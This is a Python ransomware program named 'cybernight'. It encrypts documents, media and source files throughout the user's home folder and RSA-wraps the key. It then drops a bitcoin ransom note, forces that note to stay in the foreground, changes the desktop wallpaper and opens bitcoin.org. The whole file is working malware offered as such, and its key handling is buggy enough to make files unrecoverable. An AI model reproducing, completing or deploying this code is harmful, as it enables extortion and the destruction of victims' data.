from cryptography.fernet import Fernet
import os
import urllib.request
import ctypes
import requests
import time
import concurrent.futures
import datetime
import subprocess
import win32gui
import webbrowser
from Crypto.PublicKey import RSA
from Crypto.Cipher import PKCS1_OAEP
import threading
import base64

class cybernight:
    def __init__(self):
        self.file_exts = ['png', 'pdf', 'doc', 'docx', 'txt', 'jpg', 'jpeg', 'ppt', 'pptx', 'xls', 'xlsx', 'csv', 'mp3', 'mp4', 'avi', 'wav', 'mov', 'zip', 'rar', 'html', 'css', 'js', 'py', 'java', 'cpp']
        self.key = None
        self.public_key = None
        self.crypter = None
        self.sysRoot = os.path.expanduser('~')
        self.localRoot = None
        self.decryption_completed = False

    def generate_key(self):
        self.key = Fernet.generate_key()
        self.crypter = Fernet(self.key)

    def write_key(self):
        current_directory = os.path.dirname(os.path.abspath(__file__))
        with open(os.path.join(current_directory, 'fernet_key.txt'), 'wb') as f:
            f.write(self.key)

    def encrypt_fernet_key(self):
        current_directory = os.path.dirname(os.path.abspath(__file__))
        fernet_key_path = os.path.join(current_directory, 'fernet_key.txt')
        public_key_path = os.path.join(current_directory, 'public.pem')  # Look for public.pem in the current directory

        try:
            with open(fernet_key_path, 'wb') as f:
                # Generate and write the Fernet key to fernet_key.txt
                self.key = Fernet.generate_key()
                f.write(self.key)
            
            with open(public_key_path, 'rb') as pub_key_file:
                # Import the RSA public key
                self.public_key = RSA.import_key(pub_key_file.read())
                public_crypter = PKCS1_OAEP.new(self.public_key)

                # Encrypt the Fernet key using RSA encryption
                enc_fernet_key = public_crypter.encrypt(self.key)
        except FileNotFoundError:
            print("Error: public.pem not found in the current directory.")
            return
        except Exception as e:
            print(f"Error while encrypting Fernet key: {e}")
            return

        try:
            # Write the encrypted Fernet key to fernet_key.txt
            with open(fernet_key_path, 'wb') as f:
                f.write(enc_fernet_key)
            
            # Write the encrypted Fernet key to EMAIL_ME.txt on the desktop
            with open(os.path.join(self.sysRoot, 'Desktop', 'EMAIL_ME.txt'), 'wb') as fa:
                fa.write(enc_fernet_key)
            
            # Copy the encrypted Fernet key to the system root
            with open(os.path.join(self.sysRoot, 'encrypted_fernet_key.txt'), 'wb') as fs:
                fs.write(enc_fernet_key)
            
            self.crypter = None
        except Exception as e:
            print(f"Error while writing encrypted key: {e}")

    def crypt_file(self, file_path, encrypted=False):
        try:
            with open(file_path, 'rb') as f:
                data = f.read()
                if not encrypted:
                    _data = self.crypter.encrypt(data)
                    print('> File encrypted')
                else:
                    _data = self.crypter.decrypt(data)
                    print('> File decrypted')
            with open(file_path, 'wb') as fp:
                fp.write(_data)
        except PermissionError as e:
            print(f"Permission denied: {file_path}")
        except Exception as e:
            print(f"An error occurred: {e}")

    def crypt_system(self, encrypted=False):
        def process_file(file_path):
            try:
                if not encrypted:
                    self.crypt_file(file_path)
                else:
                    self.crypt_file(file_path, encrypted=True)
            except Exception as e:
                print(f"An error occurred while processing {file_path}: {e}")

        files_to_process = []
        for root, dirs, files in os.walk(self.sysRoot):
            for file in files:
                if file.split('.')[-1] in self.file_exts:
                    files_to_process.append(os.path.join(root, file))

        with concurrent.futures.ThreadPoolExecutor() as executor:
            executor.map(process_file, files_to_process)

    def ransom_note(self):
        date = datetime.date.today().strftime('%d-%B-Y')
        ransom_note_path = os.path.join(self.sysRoot, 'RANSOM_NOTE.txt')
        with open(ransom_note_path, 'w') as f:
            f.write(f'''
Your computer has been compromised by cybernight646.ALL files has been locked.
Dont worry I'm just saying HI to u and your files.
You can say HI back by following the bitcoin url.
The earlier the better

''')
        return ransom_note_path

    def show_ransom_note(self, ransom_note_path):
        ransom = subprocess.Popen(['notepad.exe', ransom_note_path])
        count = 0
        while True:
            time.sleep(0.1)
            top_window = win32gui.GetWindowText(win32gui.GetForegroundWindow())
            if top_window == 'RANSOM_NOTE - Notepad':
                print('Ransom note is the top window - do nothing')
            else:
                print('Ransom note is not the top window - kill/create process again')
                ransom.kill()
                ransom = subprocess.Popen(['notepad.exe', ransom_note_path])
            time.sleep(10)
            count += 1
            if count == 5:
                break

    def put_me_on_desktop(self):
        print('started')
        while not self.decryption_completed:
            try:
                print('trying')
                with open(f'{self.sysRoot}/Desktop/PUT_ME_ON_DESKTOP.txt', 'r') as f:
                    self.key = f.read()
                    self.crypter = Fernet(self.key)
                    self.crypt_system(encrypted=True)
                    print('decrypted')
                    self.decryption_completed = True
                    break
            except Exception as e:
                print(e)
                pass
            time.sleep(10)
            print('Checking for PUT_ME_ON_DESKTOP.txt')

    @staticmethod
    def change_desktop_background():
        imageUrl = 'https://images.idgesg.net/images/article/2018/02/ransomware_hacking_thinkstock_903183876-100749983-large.jpg'
        path = os.path.join(os.path.expanduser('~'), 'Desktop', 'background.jpg')
        urllib.request.urlretrieve(imageUrl, path)
        SPI_SETDESKWALLPAPER = 20
        ctypes.windll.user32.SystemParametersInfoW(SPI_SETDESKWALLPAPER, 0, path, 0)
                
    @staticmethod
    def what_is_bitcoin():
        # Handle the possibility of an internet connection issue gracefully
        try:
            url = 'https://bitcoin.org'
            webbrowser.open(url)
        except Exception as e:
            print(f"Failed to open browser: {e}")

    def main(self):
        self.generate_key()
        self.crypt_system()
        self.write_key()
        ransom_note_path = self.ransom_note()
        self.encrypt_fernet_key()
        t1 = threading.Thread(target=self.show_ransom_note, args=(ransom_note_path,))
        t2 = threading.Thread(target=self.put_me_on_desktop)
        t1.start()
        print('> RansomWare: Attack completed on target machine and system is encrypted')
        print('> RansomWare: Waiting for attacker to give target machine document that will un-encrypt machine')
        t2.start()
        print('> RansomWare: Target machine has been un-encrypted')
        print('> RansomWare: Completed')

        self.change_desktop_background()
        self.what_is_bitcoin()

if __name__ == '__main__':
    rw = cybernight()
    rw.main()
